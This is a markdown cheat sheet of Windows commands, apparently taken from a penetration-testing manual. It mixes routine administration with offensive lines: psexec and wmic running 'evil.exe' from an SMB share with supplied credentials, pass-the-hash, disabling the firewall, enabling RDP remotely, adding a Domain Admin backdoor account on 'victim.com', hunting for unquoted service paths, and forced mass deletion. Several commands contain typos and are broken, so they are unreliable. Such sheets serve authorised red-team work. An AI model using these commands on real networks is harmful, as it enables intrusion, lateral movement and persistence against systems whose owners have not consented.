# Utility Commands

| Command         | Description                                   |
| --------------- | --------------------------------------------- |
| tasklist /S ip /v   | Remote process listing            |
| systeminfo /S ip /U domain\user /P Pwd   | Remote systeminfo            |
| net share \\ ip   | Shares of remote computer            |
| net use \\ ip   | Remote filesystem (IPC$)            |
| net use z: \\ ip \share password /user: DOMAIN\user   | Map drive with specified credentials            |
| reg add \\ ip \ regkey \ value   | Add registry key remotely            |
| sc \\ ip create service binpath=C:\Windows\System32\x.exe start= auto  | Create a remote service (Space after start=)            |
| xcopy /s \\ ip \dir C:\local   | Copy remote folder            |
| shutdown /m \\ ip /r /t 0 /f   | Remotely reboot machine            |
| type file   | Display file contents            |
| del path \'.' /a /s /q /f   | Forceably delete all files in path            |
| find /I "str" filename   | Find "str"            |
| command &#124; find /c /v ""   | Line count of cmd output            |
| at HH:MM file [args] | Schedule file to run   (i.e. at 14:45 cmd /c)         |
| runas /user: user " file [args] "   | Run file as user            |
| restart /r /t 0   | Restart now            |
| tr -d '\15\32' win.txt unix.txt   | Removes CR & Z (*nix)            |
| makecab file   | Native compression            |
| Wusa.exe /uninstall /kb: ###   | Uninstall patch            |
| cmd.exe "wevtutil qe Application /c:40 /f:text /rd:true"   | CLI Event Viewer            |
| lusrmgr.msc   | Local user manager            |
| services.msc   | Services control panel            |
| taskmgr.exe   | Task manager            |
| secpool.msc   | Security policy manager            |
| eventvwr.rnsc   | Event viewer            |
| rundll32.dll user32.dll LockWorkstation   | LoCK WORKSTATION            |
| netsh advfirewall set currentprofile state off <br> netsh advfirewall set allprofiles state off   | DISABLE WINDOWS FIREWALL    |
| netsh interface portproxy add v4tov4 listenport=3000 listenaddress=1.1.1.1 connectport=4000 connectaddress=2.2.2.2 | NATIVE WINDOWS PORT FORWARD ( MUST BE ADMIN)        |
| netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=1.1.1.1   | REMOVE PORT FORWARD (Must be admin)            |
| reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 0 /f   | RE-ENABLE COMMAND PROMPT        |
| psexec /accepteula \\ targetiP -u domain\user -p password -c -f \\ smbIP \share\file.exe   | EXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS            |
| psexec /accepteula \\ ip -u Domain\user -p LM : NTLM cmd.exe /c dir c:\Progra-1   | RUN REMOTE COMMAND WITH SPECIFIED HASH    |
| psexec /accepteula \\ ip -s cmd.exe   | RUN REMOTE COMMAND AS SYSTEM            |
| wmic [alias] get /?   | List all attributes            |
| wmic [alias] call /?   | Callable methods            |
| wmic process list full   | Process attributes            |
| wmic startupwmic service   | Starts wmic service            |
| wmic ntdomain list   | Domain and DC info            |
| wmic qfe   | List all patches            |
| wmic process call create "process name"   | Execute process            |
| wmic process where name="process" call terminate   | Terminate process            |
| wmic logicaldisk get description,name   | View logical shares            |
| wmic cpu get DataWidth /format:list   | Display 32 OR 64 bit            |
| WMIC [ALIAS] [WHERE] [CLAUSE] <br> <br> [alias] == process, share, startup, service, nicconfig, useraccount, etc. <br> <br> [where] == where (name="cmd.exe"), where (parentprocessid!=[pid]"), etc. <br> <br> [clause] == list [fulllbrief], get [attribl, attrib2], call [method], delete  | WMIC usage            |
| wmic /node: targetIP /user:domain\user /password:password process call create "\\smbIP\share\evil.exe"   | EXECUTE FILE HOSTED OVER SMB ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS            |
| wmic product get name /value # Get software names <br> <br> wmic product where name="XXX" call uninstall /nointeractive   | UNINSTALL SOFTWARE            |
| wmic /node:remotecomputer computersystem get username   | REMOTELY DETERMINE LOGGED IN USER            |
| wmic /node:machinename process list brief /every:1   | REMOTE PROCESS LISTING EVERY SECOND            |
| wmic /node:"machinename 4" path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"   | REMOTE START RDP            |
| wmic netlogin where (name like "%adm%") get numberoflogons   | LIST NUMBER OF TIMES USER HAS LOGGED ON            |
| wmic service get name,displayname,pathname,startmode &#124; findstr /i "auto" &#124; findstr /i /v "C:\windows\\" &#124; findstr /i /v """   | SEARCH FOR SERVICES WITH UNQUOTED PATHS TO BINARY            |
| dsquery user -limit 0   | LIST USERS ON DOMAIN WITH NO LIMIT ON RESULTS            |
| dsquery group "cn=users, dc=victim, dc=com"   | LIST GROUPS FOR DOMAIN=VICTIM.COM            |
| dsquery group -name "domain admins" &#124; dsget group -members -expand   | LIST DOMAIN ADMIN ACCOUNTS            |
| dsquery user -name bob* &#124; dsget user -memberof -expand   | LIST ALL GROUPS FOR A USER            |
| dsquerj user -name bob* &#124; dsget user -samid   | GET A USER'S LOGIN ID            |
| dsquery user -inactive 2   | LIST ACCOUNTS INACTIVE FOR 2 WEEKS            |
| dsadd user "CN=Bob,CN=Users,DC=victim,DC=com" -samid bob -pwd bobpass -display "Bob" -pwdneverexpires yes -memberof "CN=Domain Admins,CN=Users,DC=victim,DC=com   | ADD DOMAIN USER            |
| dsrm -subtree -noprompt "CN=Bob,CN=Users,DC=victim,DC=com"   | DELETE USER            |
| dsquery * "DC=victim,DC=com" -scope subtree -attr "cn" "operatingSystem" "operatingSystemServicePack" -filter "(&(objectclass=computer) (objectcategory=computer) (operatingSystem=Windows*))"   | LIST ALL OPERATING SYSTEMS ON DOMAIN            |
| dsquery site -o rdn -limit 0          | LIST ALL SITE NAMES            |
| dsquery subnet -site sitename -o rdn   | LIST ALL SUBNETS WITHIN A SITE            |
| dsquery server -site sitename -o rdn   | LIST ALL SERVERS WITHIN A SITE            |
| dsquery * domainroot -filter "(&(objectCategory=Computer) (objectClass=Computer) (operatingSystem=*Server*))" -limit 0   | FIND SERVERS IN THE DOMAIN   |
| dsquery * "CN=Sites,CN=Configuration,DC=forestRootDomain" -filter (objectCategory=Server)      | DOMAIN CONTROLLERS PER SITE |



